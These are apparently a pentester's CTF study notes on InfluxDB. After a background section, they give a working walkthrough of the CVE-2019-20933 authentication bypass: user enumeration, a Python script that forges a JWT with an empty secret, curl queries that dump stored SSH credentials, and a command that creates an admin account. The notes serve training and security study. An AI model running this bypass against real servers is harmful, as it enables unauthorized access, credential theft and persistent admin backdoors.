<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>InfluxDB</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>InfluxDB</h1><br/><p><h1>Background</h1></p><p>InfluxDB is a time series database written in Go. The default port is <strong>8086</strong>. It exposes an HTTP API for you to interact with it &amp; returns JSON data.</p><p></p><p>InfluxDB uses InfluxQL, which is very similar to SQL (SQL-Like).</p><p></p><p><h2>InfluxDB vs Traditional SQL</h2></p><p><table class="table"><tr><th>Feature</th><th>InfluxDB</th><th>Traditional SQL</th></tr><tr><td>Language</td><td>InfluxQL (SQL-like)	</td><td>SQL</td></tr><tr><td>Data model</td><td>Time series (time-stamped data, optimized for metrics/logs)	</td><td>Relational (tables, rows, columns)</td></tr><tr><td>Tables</td><td>Called measurements</td><td>Tables</td></tr><tr><td>Rows</td><td>Called points (with timestamp, fields, and tags)	</td><td>Rows</td></tr><tr><td>Schema</td><td>Flexible schema (no need to define in advance)</td><td>Rigid schema (must define types/columns)</td></tr><tr><td>Indexes</td><td>Time and tag-based indexing</td><td>B-tree, full-text, etc.</td></tr><tr><td>Joins</td><td>Very limited or none (in InfluxQL)</td><td>Full JOIN support</td></tr><tr><td>Optimized for</td><td>Time series: metrics, logs, events</td><td>General-purpose data storage</td></tr></table></p><p></p><p><h2>Series</h2></p><p>In InfluxDB, a Series is one of the core concepts, but it doesn&#39;t map directly to a single SQL concept. Instead, it&#39;s best thought of as a unique combination of a measurement and a <span style="color:#ff0000;">set of tag key-value pairs</span>.</p><p></p><p>A Series is conceptually similar to a Python dictionary (but somewhat different in the way that it functions &amp; the way that you interact with it).</p><p></p><p>A Series is defined as follows:</p><p></p><p><strong>&lt;measurement_name&gt;,&lt;tag1&gt;=&lt;value1&gt;,&lt;tag2&gt;=&lt;value2&gt;</strong></p><p></p><p><strong>cpu,host=server1,region=us-west</strong></p><p></p><p><h2>Influx Client Tool</h2></p><p>Although you can use <strong>curl</strong> to query the InfluxDB API, you may want to use the <strong>influx</strong> client tool for ease of use &amp; easier debugging (human readable erros instead of Raw JSON or HTTP codes).</p><p></p><p>However, unlike <strong>curl</strong>, you can&#39;t use a JWT for authentication when using <strong>influx</strong>.</p><p></p><p><h3>Authentication</h3></p><p>You need to use <strong>curl</strong> if you want to use a forged JWT for authentication bypass (CVE-2019-20933). Different methods of authentication are used for InfluxDB 1.x &amp; InfluxDB 2.x +.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">InfluxDB 2.x</span>: Uses <span style="color:#ff0000;">InfluxDB API tokens</span> (built-in token / session handling). Doesn&#39;t support credentials passed as arguments via CLi.</p><p></p><p>After authenticating with the following command, all subsequent CLi commands will automatically use that token under the hood.</p><p></p><p><em>influx config create \</em><em></em></p><p><em>  --config-name myconfig \</em><em></em></p><p><em>  --host-url http://localhost:8086 \</em><em></em></p><p><em>  --org myorg \</em><em></em></p><p><em>  --token &lt;influxdb_generated_token&gt; \</em><em></em></p><p><em>  --active</em></p><p>  </p><p><span style="color:#8ff0a4;text-decoration:underline;">InfluxDB 1.x</span>: Credentials are passed as arguments via CLi. Doesn&#39;t support the use of InfluxDB API tokens.</p><p></p><p><em>influx -username &#39;myuser&#39; -password &#39;mypassword&#39; -host &#39;localhost&#39; -port 8086</em></p><p><em></em></p><p><em>influx -host 10.0.0.1 -port 8086 -database &lt;database&gt;</em><em></em></p><p><em></em><em></em></p><p><em>influx -host 10.0.0.1 -port 8086 -username &lt;username&gt;  -password &lt;password&gt;</em></p><p></p><p><em>influx -username &#39;myuser&#39; -password &#39;mypassword&#39; -execute &#39;SELECT * FROM cpu&#39;</em></p><p></p><p><h3>Import db file</h3></p><p><em>influx -path example.db</em></p><p></p><p><h1>Authentication Bypass version ≤ 1.7.6 (CVE-2019-20933)</h1></p><p>[CTF D 53]</p><p></p><p>See <a href="https://www.komodosec.com/post/when-all-else-fails-find-a-0-day">Komodosec</a> &amp;  <a href="https://exploit-notes.hdks.org/exploit/database/influxdb-pentesting/">Exploit-Notes</a> (don&#39;t copy / paste commands. Quotes are irregular) </p><p></p><p><h2>User Enumeration</h2></p><p><em>curl http://10.10.47.167:8086/debug/requests</em></p><p></p><p><strong>{</strong><strong></strong></p><p><strong>&quot;</strong><strong><span style="color:#ff0000;">bob</span></strong><strong>:127.0.0.1&quot;: {&quot;writes&quot;:2,&quot;queries&quot;:2}</strong><strong></strong></p><p><strong>}</strong></p><p></p><p><h2>Forge JWT</h2></p><p>The default setup of the JWT for InfluxDB doesn&#39;t create any value in the &quot;shared-secret&quot; key. In other words, the &quot;<span style="color:#ff0000;">secret</span>&quot; needed to create a valid JWT token is <span style="color:#ff0000;">empty by default</span> (highly unusual in other contexts).</p><p></p><p>Users are expected to generate a secure secret on their own, but the documentation doesn’t mention that, so it&#39;s common to find the default configuration. </p><p></p><p>Therefore, you can bypass authentication by generating a JWT using the following Python code (replace <strong>bob</strong> with the previously obtained username).</p><p></p><p><h3>JWT Structure</h3></p><p><span style="color:#8ff0a4;text-decoration:underline;">header</span>: <strong>{&quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;}</strong></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">payload</span>:  <strong>{&quot;username&quot;:&quot;</strong>&lt;input user name here&gt;<strong>&quot;,&quot;exp&quot;:1548669066}</strong></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">signature</span>: The signature is generated based off of the following algorithm. An empty string is provided as the value of the secret key for this Authentication Bypass (you still need to include the empty string when computing the signature).</p><p></p><p><strong>HMACSHA256(base64UrlEncode(header) + &quot;.&quot; +base64UrlEncode(payload),</strong>&lt;leave this field empty&gt;<strong>)</strong></p><p></p><p><h3>Generate with Python</h3></p><p><strong>import hmac</strong><strong></strong></p><p><strong>import hashlib</strong><strong></strong></p><p><strong>import base64</strong><strong></strong></p><p><strong>import json</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>def base64url_encode(data: bytes) -&gt; str:</strong><strong></strong></p><p><strong>    return base64.urlsafe_b64encode(data).rstrip(b&#39;=&#39;).decode(&#39;utf-8&#39;)</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong># Header and payload</strong><strong></strong></p><p><strong>header = {</strong><strong></strong></p><p><strong>    &quot;sub&quot;: &quot;123456789&quot;,</strong><strong></strong></p><p><strong>    &quot;alg&quot;: &quot;HS256&quot;,</strong><strong></strong></p><p><strong>    &quot;typ&quot;: &quot;JWT&quot;</strong><strong></strong></p><p><strong>}</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>payload = {</strong><strong></strong></p><p><strong>    &quot;username&quot;: &quot;bob&quot;,</strong><strong></strong></p><p><strong>    &quot;exp&quot;: 21548669066</strong><strong></strong></p><p><strong>}</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong># Encode header and payload</strong><strong></strong></p><p><strong>header_b64 = base64url_encode(json.dumps(header, separators=(&#39;,&#39;, &#39;:&#39;)).encode())</strong><strong></strong></p><p><strong>payload_b64 = base64url_encode(json.dumps(payload, separators=(&#39;,&#39;, &#39;:&#39;)).encode())</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong># Message to sign</strong><strong></strong></p><p><strong>message = f&quot;{header_b64}.{payload_b64}&quot;</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong># Empty secret key</strong><strong></strong></p><p><strong>secret = b&#39;&#39;</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong># Generate HMAC SHA256 signature</strong><strong></strong></p><p><strong>signature = hmac.new(secret, message.encode(), hashlib.sha256).digest()</strong><strong></strong></p><p><strong>signature_b64 = base64url_encode(signature)</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong># Final JWT</strong><strong></strong></p><p><strong>jwt = f&quot;{header_b64}.{payload_b64}.{signature_b64}&quot;</strong><strong></strong></p><p><strong>print(jwt)</strong></p><p></p><p><h2>Using JWT</h2></p><p>You can query the API to retrieve JSON data using curl &amp; the forged JWT (set its value using an Environment Variable).</p><p></p><p><em>INFLUXDB_JWT=&quot;eyJzdWIiOiIxMjM0NTY3ODkiLCJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoyMTU0ODY2OTA2Nn0.SVTC1ec9KZGhDcjO4dzQ6tjjjoSfKngbCKjauM1t4t0&quot;</em></p><p></p><p><h3>List Databases</h3></p><p><em>curl http://10.10.47.167:8086/query -H &quot;Authorization: Bearer $INFLUXDB_JWT&quot; --data-urlencode &#39;q=SHOW DATABASES&#39; | jq</em></p><p></p><p><strong>{</strong><strong></strong></p><p><strong>  &quot;results&quot;: [</strong><strong></strong></p><p><strong>    {</strong><strong></strong></p><p><strong>      &quot;statement_id&quot;: 0,</strong><strong></strong></p><p><strong>      &quot;series&quot;: [</strong><strong></strong></p><p><strong>        {</strong><strong></strong></p><p><strong>          &quot;name&quot;: &quot;databases&quot;,</strong><strong></strong></p><p><strong>          &quot;columns&quot;: [</strong><strong></strong></p><p><strong>            &quot;name&quot;</strong><strong></strong></p><p><strong>          ],</strong><strong></strong></p><p><strong>          &quot;values&quot;: [</strong><strong></strong></p><p><strong>            [</strong><strong></strong></p><p><strong>              &quot;</strong><strong><span style="color:#ff0000;">creds</span></strong><strong>&quot;</strong><strong></strong></p><p><strong>            ],</strong><strong></strong></p><p><strong>            [</strong><strong></strong></p><p><strong>              &quot;</strong><strong><span style="color:#ff0000;">docker</span></strong><strong>&quot;</strong><strong></strong></p><p><strong>            ],</strong><strong></strong></p><p><strong>            [</strong><strong></strong></p><p><strong>              &quot;</strong><strong><span style="color:#ff0000;">tanks</span></strong><strong>&quot;</strong><strong></strong></p><p><strong>            ],</strong><strong></strong></p><p><strong>            [</strong><strong></strong></p><p><strong>              &quot;</strong><strong><span style="color:#ff0000;">mixer</span></strong><strong>&quot;</strong><strong></strong></p><p><strong>            ],</strong><strong></strong></p><p><strong>            [</strong><strong></strong></p><p><strong>              &quot;</strong><strong><span style="color:#ff0000;">_internal</span></strong><strong>&quot;</strong><strong></strong></p><p><strong>            ]</strong><strong></strong></p><p><strong>          ]</strong><strong></strong></p><p><strong>        }</strong><strong></strong></p><p><strong>      ]</strong><strong></strong></p><p><strong>    }</strong><strong></strong></p><p><strong>  ]</strong><strong></strong></p><p><strong>}</strong></p><p></p><p><h3>List Measurements (Table Equivalent)</h3></p><p><em>curl http://10.10.47.167:8086/query -H &quot;Authorization: Bearer $INFLUXDB_JWT&quot; --data-urlencode &#39;db=creds&#39; --data-urlencode &#39;q=SHOW MEASUREMENTS&#39; | jq</em></p><p></p><p><strong>{</strong><strong></strong></p><p><strong>  &quot;results&quot;: [</strong><strong></strong></p><p><strong>    {</strong><strong></strong></p><p><strong>      &quot;statement_id&quot;: 0,</strong><strong></strong></p><p><strong>      &quot;series&quot;: [</strong><strong></strong></p><p><strong>        {</strong><strong></strong></p><p><strong>          &quot;name&quot;: &quot;measurements&quot;,</strong><strong></strong></p><p><strong>          &quot;columns&quot;: [</strong><strong></strong></p><p><strong>            &quot;name&quot;</strong><strong></strong></p><p><strong>          ],</strong><strong></strong></p><p><strong>          &quot;values&quot;: [</strong><strong></strong></p><p><strong>            [</strong><strong></strong></p><p><strong>              &quot;</strong><strong><span style="color:#ff0000;">ssh</span></strong><strong>&quot;</strong><strong></strong></p><p><strong>            ]</strong><strong></strong></p><p><strong>          ]</strong><strong></strong></p><p><strong>        }</strong><strong></strong></p><p><strong>      ]</strong><strong></strong></p><p><strong>    }</strong><strong></strong></p><p><strong>  ]</strong><strong></strong></p><p><strong>}</strong></p><p></p><p><h3>List Series</h3></p><p>The JSON returned includes only the data (columns and values), plus optional tags in the series object if any.</p><p></p><p><em>curl http://10.10.47.167:8086/query -H &quot;Authorization: Bearer $INFLUXDB_JWT&quot; --data-urlencode &#39;db=creds&#39; --data-urlencode &#39;q=SHOW SERIES&#39; | jq</em></p><p></p><p><strong>{</strong><strong></strong></p><p><strong>  &quot;results&quot;: [</strong><strong></strong></p><p><strong>    {</strong><strong></strong></p><p><strong>      &quot;statement_id&quot;: 0,</strong><strong></strong></p><p><strong>      &quot;series&quot;: [</strong><strong></strong></p><p><strong>        {</strong><strong></strong></p><p><strong>          &quot;columns&quot;: [</strong><strong></strong></p><p><strong>            &quot;key&quot;</strong><strong></strong></p><p><strong>          ],</strong><strong></strong></p><p><strong>          &quot;values&quot;: [</strong><strong></strong></p><p><strong>            [</strong><strong></strong></p><p><strong>              &quot;ssh,user=uzJk6Ry98d8C&quot;</strong><strong></strong></p><p><strong>            ]</strong><strong></strong></p><p><strong>          ]</strong><strong></strong></p><p><strong>        }</strong><strong></strong></p><p><strong>      ]</strong><strong></strong></p><p><strong>    }</strong><strong></strong></p><p><strong>  ]</strong><strong></strong></p><p><strong>}</strong></p><p></p><p><h3>Enumerate Series Data</h3></p><p>You can dump the contents of a Series by using the previously obtained <span style="color:#ff0000;">Measurement</span> (e.g. ssh).</p><p></p><p><em>curl http://10.10.47.167:8086/query -H &quot;Authorization: Bearer $INFLUXDB_JWT&quot; --data-urlencode &#39;db=creds&#39; --data-urlencode &#39;q=SELECT * FROM </em><em><span style="color:#ff0000;">ssh</span></em><em>;&#39; | jq</em></p><p></p><p><strong>{</strong><strong></strong></p><p><strong>  &quot;results&quot;: [</strong><strong></strong></p><p><strong>    {</strong><strong></strong></p><p><strong>      &quot;statement_id&quot;: 0,</strong><strong></strong></p><p><strong>      &quot;series&quot;: [</strong><strong></strong></p><p><strong>        {</strong><strong></strong></p><p><strong>          &quot;name&quot;: &quot;ssh&quot;,</strong><strong></strong></p><p><strong>          &quot;columns&quot;: [</strong><strong></strong></p><p><strong>            &quot;time&quot;,</strong><strong></strong></p><p><strong>            &quot;pw&quot;,</strong><strong></strong></p><p><strong>            &quot;user&quot;</strong><strong></strong></p><p><strong>          ],</strong><strong></strong></p><p><strong>          &quot;values&quot;: [</strong><strong></strong></p><p><strong>            [</strong><strong></strong></p><p><strong>              &quot;2021-05-16T12:00:00Z&quot;,</strong><strong></strong></p><p><strong>              7788764472,</strong><strong></strong></p><p><strong>              &quot;uzJk6Ry98d8C&quot;</strong><strong></strong></p><p><strong>            ]</strong><strong></strong></p><p><strong>          ]</strong><strong></strong></p><p><strong>        }</strong><strong></strong></p><p><strong>      ]</strong><strong></strong></p><p><strong>    }</strong><strong></strong></p><p><strong>  ]</strong><strong></strong></p><p><strong>}</strong></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Interpretting Results</span>: The Columns are listed sequentially &amp; the corresponding values are output on their own line. In this case, it&#39;s saying that the user <strong>uzJk6Ry98d8C</strong> has the password <strong>7788764472</strong>.</p><p></p><p><h3>Create a Privileged Account</h3></p><p>You may also be able to create a new Admin user.</p><p></p><p><em>curl http://&lt;target-ip&gt;:8086/query -H &quot;Authorization: Bearer $INFLUXDB_JWT” --data-urlencode “q=CREATE USER tester with PASSWORD &#39;password’ with ALL PRIVILEGES”</em></p></div>
</body>
</html>
